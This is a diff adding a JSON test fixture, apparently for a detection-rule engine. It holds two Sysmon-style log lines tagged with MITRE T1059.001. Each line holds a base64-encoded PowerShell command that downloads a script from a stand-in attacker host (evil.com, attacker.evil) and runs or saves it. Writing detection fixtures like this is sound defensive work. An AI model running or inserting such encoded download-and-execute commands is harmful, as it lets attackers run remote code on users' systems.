@@ -1,0 +1,14 @@
+[
+  {
+    "raw": "2026-09-17 10:15:23 PID:4521 TID:3847 \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+    "source": "sysmon",
+    "technique_id": "T1059.001",
+    "expected_rules": ["e9a8f5d0-3b2c-4a7d-9f1e-6d5b8c3a2f1d"]
+  },
+  {
+    "raw": "2026-09-17 10:22:41 PID:3784 TID:2910 \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -encodedcommand JgAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AF0AOgA6AEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGUAdgBpAGwALwBtAGEAaQBuAC4AcABzADEAJwAsACcAYwA6AFwAdABlAG0AcAAuAHAAcwAxACcAKQA=",
+    "source": "sysmon",
+    "technique_id": "T1059.001",
+    "expected_rules": ["e9a8f5d0-3b2c-4a7d-9f1e-6d5b8c3a2f1d"]
+  }
+]
